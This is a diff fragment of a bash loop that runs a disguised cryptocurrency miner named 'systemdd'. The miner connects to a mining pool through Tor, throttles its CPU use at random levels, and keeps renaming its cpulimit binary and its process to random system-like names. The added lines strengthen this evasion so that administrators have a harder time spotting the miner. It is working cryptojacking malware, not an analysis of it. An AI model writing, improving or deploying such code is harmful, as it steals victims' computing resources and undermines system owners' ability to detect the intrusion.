@@ -52,6 +52,18 @@ while true; do
   CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)
   CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))
 
-  echo "Restarting systemdd process with new name: $FINAL_NAME"
-  sudo -u nobody cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
+  # Remove old cpulimit name if it exists
+  if [ -f /usr/bin/$CPULIMIT_NAME ]; then
+    echo "Removing old cpulimit: $CPULIMIT_NAME"
+    rm -f /usr/bin/$CPULIMIT_NAME
+  fi
+
+  # Generate a new name for cpulimit by combining RANDOM_AI_NAME and RANDOM_NUMBER
+  CPULIMIT_NAME="${RANDOM_AI_NAME}_${RANDOM_NUMBER}"
+  cp /usr/bin/cpulimit /usr/bin/$CPULIMIT_NAME
+
+  echo "Restarting systemdd process with new name: $FINAL_NAME and cpulimit: $CPULIMIT_NAME"
+  sudo -u nobody /usr/bin/$CPULIMIT_NAME -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050 &
+
+  prctl --set-name "$RANDOM_SYSTEM_PROCESS"
 done
